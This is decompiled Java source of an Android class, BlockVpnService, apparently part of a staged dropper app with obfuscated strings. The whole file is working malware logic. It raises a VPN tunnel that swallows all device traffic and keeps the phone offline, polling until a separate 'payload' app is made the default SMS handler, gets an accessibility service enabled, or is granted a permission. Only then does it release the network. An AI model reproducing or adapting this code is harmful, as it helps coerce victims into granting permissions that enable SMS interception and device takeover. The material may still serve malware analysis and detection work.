package com.template.shellapp.services;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.net.VpnService;
import android.os.Handler;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.provider.Telephony;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;
import java.util.Iterator;
import kotlin.Metadata;
import kotlin.jvm.internal.DefaultConstructorMarker;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage2/classes.dex */
@Metadata(d1 = {"\u0000<\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\b\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0005\u0018\u0000 \u00182\u00020\u0001:\u0001\u0018B\u0007¢\u0006\u0004\b\u0002\u0010\u0003J\"\u0010\n\u001a\u00020\u000b2\b\u0010\f\u001a\u0004\u0018\u00010\r2\u0006\u0010\u000e\u001a\u00020\u000b2\u0006\u0010\u000f\u001a\u00020\u000bH\u0016J\b\u0010\u0010\u001a\u00020\u0011H\u0002J\u0010\u0010\u0012\u001a\u00020\t2\u0006\u0010\u0013\u001a\u00020\u0014H\u0002J\u0010\u0010\u0015\u001a\u00020\t2\u0006\u0010\u0013\u001a\u00020\u0014H\u0002J\b\u0010\u0016\u001a\u00020\u0011H\u0002J\b\u0010\u0017\u001a\u00020\u0011H\u0016R\u0010\u0010\u0004\u001a\u0004\u0018\u00010\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0007X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\tX\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006\u0019"}, d2 = {"Lcom/template/shellapp/services/BlockVpnService;", "Landroid/net/VpnService;", "<init>", "()V", "tunnel", "Landroid/os/ParcelFileDescriptor;", "handler", "Landroid/os/Handler;", "checking", "", "onStartCommand", "", "intent", "Landroid/content/Intent;", "flags", "startId", "schedulePermissionCheck", "", "isPayloadPermissionGranted", "targetPkg", "", "isAccessibilityEnabled", "closeTunnel", "onDestroy", "Companion", "app_release"}, k = 1, mv = {2, 1, 0}, xi = 48)
public final class BlockVpnService extends VpnService {
    private boolean checking;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private ParcelFileDescriptor tunnel;
    public static final String ACTION_STOP = C0000.decode(new byte[]{90, 91, 11, 74, 21, 85, 84, 68, 10, 5, 21, 85, 23, 71, 14, 1, 13, 92, 88, 68, 22, 74, 50, 100, 118, 100, 57, 50, 49, 126}, "94fda0", 0.0f);
    private static final String TAG = C0000.decode(new byte[]{112, 97, 49, 121}, "27a7ee09a420ab", 0.0f);

    /* JADX INFO: renamed from: Companion, reason: from kotlin metadata */
    public static final Companion INSTANCE = new Companion(null);

    private final void closeTunnel() {
        try {
            ParcelFileDescriptor parcelFileDescriptor = this.tunnel;
            if (parcelFileDescriptor != null) {
                parcelFileDescriptor.close();
            }
        } catch (Exception unused) {
        }
        this.tunnel = null;
        Log.d(C0000.decode(new byte[]{114, 51, 99, 120}, "0e36c44e6c"), C0000.decode(new byte[]{65, 68, 88, 13, 80, 10, 23, 1, 85, 90, 23, 93, 87, 21, -43, -74, -95, 17, 95, 13, 65, 3, 69, 12, 92, 65, 68, 74, 86, 70, 67, 89, 71, 84, 82}, "516c5f7b95d83576"));
    }

    private final boolean isAccessibilityEnabled(String targetPkg) {
        try {
            Object systemService = getSystemService(C0000.decode(new byte[]{5, 90, 6, 87, 75, 71, 11, 87, 91, 94, 95, 68, 29}, "d9e284b52260"));
            AccessibilityManager accessibilityManager = systemService instanceof AccessibilityManager ? (AccessibilityManager) systemService : null;
            if (accessibilityManager == null) {
                return false;
            }
            Iterator<AccessibilityServiceInfo> it = accessibilityManager.getEnabledAccessibilityServiceList(-1).iterator();
            while (it.hasNext()) {
                String id = it.next().getId();
                if (id != null && StringsKt.startsWith$default(id, targetPkg + C0000.decode(new byte[]{77}, "b541dc677e", true), false, 2, (Object) null)) {
                    return true;
                }
            }
        } catch (Exception unused) {
        }
        return false;
    }

    private final boolean isPayloadPermissionGranted(String targetPkg) {
        String string = getSharedPreferences(C0000.decode(new byte[]{4, 70, 18, 103, 6, 86, 17, 87}, "e6b8b7", 0.0f), 0).getString(C0000.decode(new byte[]{69, 64}, "54c69974", 5), "");
        if (Intrinsics.areEqual(string != null ? string : "", C0000.decode(new byte[]{19, 3, 21}, "aba9d1", true))) {
            return isAccessibilityEnabled(targetPkg);
        }
        try {
            if (Intrinsics.areEqual(targetPkg, Telephony.Sms.getDefaultSmsPackage(this))) {
                return true;
            }
        } catch (Exception unused) {
        }
        try {
            return getPackageManager().checkPermission(C0000.decode(new byte[]{7, 94, 5, 65, 14, 10, 86, 76, 17, 4, 17, 92, 92, 21, 65, 91, 9, 94, 79, 97, 36, 32, 119, 43, 55, 36, 60, 98, 120, 53}, "f0a3ac2baac15f22"), targetPkg) == 0;
        } catch (Exception unused2) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void schedulePermissionCheck$lambda$0(BlockVpnService blockVpnService) {
        if (blockVpnService.checking) {
            String string = blockVpnService.getSharedPreferences(C0000.decode(new byte[]{4, 69, 71, 110, 92, 83, 67, 87}, "e5718276efea9b", false), 0).getString(C0000.decode(new byte[]{65, 70}, "56decdb656af8c0c", 0.0f), null);
            if (string == null || !blockVpnService.isPayloadPermissionGranted(string)) {
                blockVpnService.schedulePermissionCheck();
                return;
            }
            Log.d(C0000.decode(new byte[]{36, 48, 53, 118}, "ffe8ffc4", 0.0f), C0000.decode(new byte[]{68, 81, 76, 8, 94, 83, 84, 24, 65, 1, 64, 12, 8, 16, 71, 89, 90, 10, 17, 85, 66, 89, 95, 16, 87, 5, 77, 67, 71, 68, 90, 20, 65, 91, 94, 95, 17, 50, 98, 47}, "405d12081d2aac", 2));
            blockVpnService.checking = false;
            blockVpnService.closeTunnel();
            blockVpnService.stopSelf();
        }
    }

    @Override // android.app.Service
    public void onDestroy() {
        this.checking = false;
        closeTunnel();
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean zAreEqual = Intrinsics.areEqual(intent != null ? intent.getAction() : null, C0000.decode(new byte[]{80, 89, 90, 24, 64, 3, 12, 22, 85, 4, 69, 81, 29, 69, 95, 83, 88, 10, 0, 22, 73, 75, 98, 96, 124, 102, 104, 96, 100, 40}, "36764faf9e14"));
        String strDecode = C0000.decode(new byte[]{112, 102, 52, 40}, "20df5e", false);
        if (zAreEqual) {
            Log.d(strDecode, C0000.decode(new byte[]{65, 77, 12, 21, 22, 69, 4, 21, 16, 87, 67, 68, 87, 93}, "29ce67ade200"));
            this.checking = false;
            closeTunnel();
            stopSelf();
            return 2;
        }
        if (this.tunnel == null) {
            try {
                this.tunnel = new VpnService.Builder(this).addAddress(C0000.decode(new byte[]{85, 81, 25, 82, 29, 82, 75, 86}, "da7b3bed", 0.0f), 32).addRoute(C0000.decode(new byte[]{83, 29, 85, 24, 86, 31, 81}, "c3e6f1a19d80a07d", 2), 0).addRoute(C0000.decode(new byte[]{92, 14}, "f47d376dd2da"), 0).setSession(C0000.decode(new byte[]{100, 83, 87, 20, 16, 83, 116, 89, 90, 15, 7, 85, 67, 95, 91, 15}, "764ab6", false)).setBlocking(true).establish();
                Log.d(strDecode, C0000.decode(new byte[]{69, 77, 89, 87, 84, 15, 20, 84, 65, 65, 80, 90, 91, 80, 66, 11, 81, 85, 18, -41, -79, -84, 23, 80, 95, 23, 81, 67, 92, 80, 69, 24, 85, 85, 94, 0, 95, 84, 86}, "18791c4125"));
            } catch (Exception e) {
                Log.e(strDecode, C0000.decode(new byte[]{82, 21, 16, 80, 91, 89, 91, 18, 13, 21, 81, 7, 13, 93, 92, 81, 8, 65}, "7fd1952ae5", 0.0f) + e.getMessage());
            }
        }
        if (!this.checking) {
            this.checking = true;
            schedulePermissionCheck();
        }
        return 1;
    }

    @Metadata(d1 = {"\u0000 \n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0086\u0003\u0018\u00002\u00020\u0001B\t\b\u0002¢\u0006\u0004\b\u0002\u0010\u0003J\u000e\u0010\u0007\u001a\u00020\b2\u0006\u0010\t\u001a\u00020\nR\u000e\u0010\u0004\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0005X\u0086T¢\u0006\u0002\n\u0000¨\u0006\u000b"}, d2 = {"Lcom/template/shellapp/services/BlockVpnService$Companion;", "", "<init>", "()V", "TAG", "", "ACTION_STOP", "stop", "", "context", "Landroid/content/Context;", "app_release"}, k = 1, mv = {2, 1, 0}, xi = 48)
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        public final void stop(Context context) {
            Intrinsics.checkNotNullParameter(context, C0000.decode(new byte[]{0, 88, 92, 76, 1, 72, 23}, "c728d0c522c6", true));
            Intent intent = new Intent(context, (Class<?>) BlockVpnService.class);
            intent.setAction(C0000.decode(new byte[]{82, 86, 92, 77, 21, 6, 84, 71, 88, 85, 69, 92, 31, 16, 9, 6, 85, 91, 85, 68, 65, 23, 98, 55, 46, 51, 102, 97, 100, 122}, "191cac9744"));
            context.startService(intent);
        }

        private Companion() {
        }
    }

    private final void schedulePermissionCheck() {
        this.handler.postDelayed(new Runnable() { // from class: com.template.shellapp.services.BlockVpnService$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                BlockVpnService.schedulePermissionCheck$lambda$0(this.f$0);
            }
        }, 3000L);
    }
}
